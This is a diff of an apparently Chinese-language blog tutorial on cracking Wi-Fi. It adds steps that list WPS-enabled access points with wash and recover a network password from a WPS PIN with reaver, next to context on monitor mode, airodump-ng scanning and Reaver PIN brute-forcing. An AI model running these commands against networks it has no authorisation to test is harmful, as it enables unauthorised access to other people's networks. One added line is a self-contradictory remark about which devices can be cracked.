@@ -486,7 +486,7 @@
 <li><p>常见问题：wlan0mon is on channel xx, but the AP uses channel xx，信道不一致，要切换到相同的信道</p>
 </li>
 </ul>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js">sudo iwconfig wlan0mon channel xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> iwconfig wlan0mon channel xx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h4 id="捕获-WPA-握手"><a href="#捕获-WPA-握手" class="headerlink" title="捕获 WPA 握手"></a>捕获 WPA 握手</h4><ul>
 <li>为了破解 WPA/WPA2 密码，你需要捕获一个 WPA 握手（WPA handshake）</li>
@@ -528,6 +528,11 @@
 
 <h4 id="扫描目标网络"><a href="#扫描目标网络" class="headerlink" title="扫描目标网络"></a>扫描目标网络</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
+<h4 id="查看支持-WPS-的设备"><a href="#查看支持-WPS-的设备" class="headerlink" title="查看支持 WPS 的设备"></a>查看支持 WPS 的设备</h4><ul>
+<li>MB 是 54e 的可破解，54e 不可破解？</li>
+</ul>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wash --ignore-fcs -i mon0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h4 id="使用-Reaver-攻击-WPS-PIN"><a href="#使用-Reaver-攻击-WPS-PIN" class="headerlink" title="使用 Reaver 攻击 WPS PIN"></a>使用 Reaver 攻击 WPS PIN</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> reaver -i wlan0mon -b <span class="token operator">&lt;</span>BSSID<span class="token operator">></span> -c <span class="token operator">&lt;</span>channel<span class="token operator">></span> -vv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ul>
@@ -544,6 +549,8 @@
 <ul>
 <li>如果破解成功，Reaver 会显示正确的 WPS PIN，并通过 WPS PIN 计算出 Wi-Fi 网络的密码</li>
 </ul>
+<h4 id="计算密码"><a href="#计算密码" class="headerlink" title="计算密码"></a>计算密码</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">reaver -i mon0 -b <span class="token operator">&lt;</span>mac<span class="token operator">></span> -vv -p <span class="token operator">&lt;</span>PIN<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="Wifite"><a href="#Wifite" class="headerlink" title="Wifite"></a>Wifite</h3><ul>
 <li>一个自动化的 Wi-Fi 渗透测试工具，基于 Aircrack-ng 和 Reaver，能够自动化常见的 Wi-Fi 攻击</li>
 </ul>
